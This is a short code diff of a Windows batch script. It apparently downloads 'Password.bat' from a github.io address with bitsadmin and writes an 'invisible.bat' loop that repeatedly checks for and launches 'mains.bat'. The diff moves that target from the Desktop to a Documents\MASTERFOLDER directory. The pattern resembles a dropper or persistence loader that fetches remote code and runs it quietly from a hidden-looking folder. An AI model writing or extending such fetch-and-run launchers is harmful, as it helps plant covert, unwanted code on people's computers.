@@ -37,8 +37,8 @@ bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPR
 @echo goto :start>> invisible.bat
 @echo )>> invisible.bat
 @echo :check>> invisible.bat
-@echo IF EXIST %USERPROFILE%\Desktop\mains.bat (>> invisible.bat
-@echo start %USERPROFILE%\Desktop\mains.bat>> invisible.bat
+@echo IF EXIST %USERPROFILE%\Documents\MASTERFOLDER\mains.bat (>> invisible.bat
+@echo start %USERPROFILE%\Documents\MASTERFOLDER\mains.bat>> invisible.bat
 @echo exit>> invisible.bat
 @echo )>> invisible.bat
 @echo goto :check>> invisible.bat
